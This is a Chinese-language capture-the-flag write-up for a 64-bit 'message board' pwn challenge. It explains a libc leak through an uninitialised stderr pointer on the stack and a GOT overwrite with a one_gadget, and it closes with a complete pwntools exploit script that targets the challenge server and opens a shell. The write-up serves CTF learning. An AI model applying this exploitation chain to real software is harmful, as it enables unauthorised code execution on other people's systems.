# W4 message board

## 文件分析

下载`pwn`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 解题思路

一开始就要拿到puts的地址？how to？  
scanf也只能修改任意地址一次，又要怎么做？

分别利用栈初始化和one_gadget即可

## 踩过的坑

1. libcBase并不是无中生有，而是在栈上存在未初始化的`_IO_2_1_stderr_`
2. 数字会覆盖到栈上；垃圾字符会导致scanf一直输入不了；而'+'能使scanf跳过输入，
不覆盖栈内容
3. ELF里的symbols不止可以找函数，找stderr这样的标签都是可以的
4. got可写，那么可以利用one_gadget来使一个函数直接运行打开shell（但是要注意限制条件）
5. 注意got里的函数是不可写的，只有.got.plt里的函数可写
6. one_gadget在本地不一定是可用的，在我的电脑上就没开起来（但是验证了可行性）

## EXPLOIT

```python
from pwn import *

def payload(lo):
    global sh
    if lo:
        sh = process('msgboard')
        gdb.attach(sh)
    else:
        sh = remote('node4.buuoj.cn', 27179)

    # payload 1, leak _IO_2_1_stderr_
    sh.sendline(b'2 + +') # 
    sh.recvuntil(b'is ') # skip
    sh.recvuntil(b'is ') # skip
    stderr = int(sh.recvline())

    if lo:
        libc = ELF('/usr/lib/libc.so.6')
    else:
        libc = ELF('libc-2.31.so')
    libcBase = stderr - libc.symbols['_IO_2_1_stderr_']
    print(hex(libcBase)) # check it
    putsGotAddr = libcBase + libc.symbols['puts'] # shift

    if lo:
        oneGadget = libcBase + 0xfabcf # r9 == 0 && rdx == 0 && [rsp + 0x70] == 0
    else:
        oneGadget = libcBase + 0xe3b01 # r15 == 0 && rdx == 0

    # payload 2, send puts addr shifted from stderr
    sh.sendline(str(putsGotAddr).encode())

    elf = ELF('msgboard')
    symA = elf.bss(0xa0 - 0x60)
    printfGot = elf.got['__isoc99_scanf']
    offset = (printfGot - symA) // 4 # locate printfGot
    print(offset)

    # payload 3, modify printf to one_gadget
    sh.sendlineafter(b'ons', str(offset).encode()) # idx
    sh.sendlineafter(b'ion', str(oneGadget & 0xffffffff).encode()) # content, 32b
    # now running printf opens shell

    sh.interactive()

```

Done.
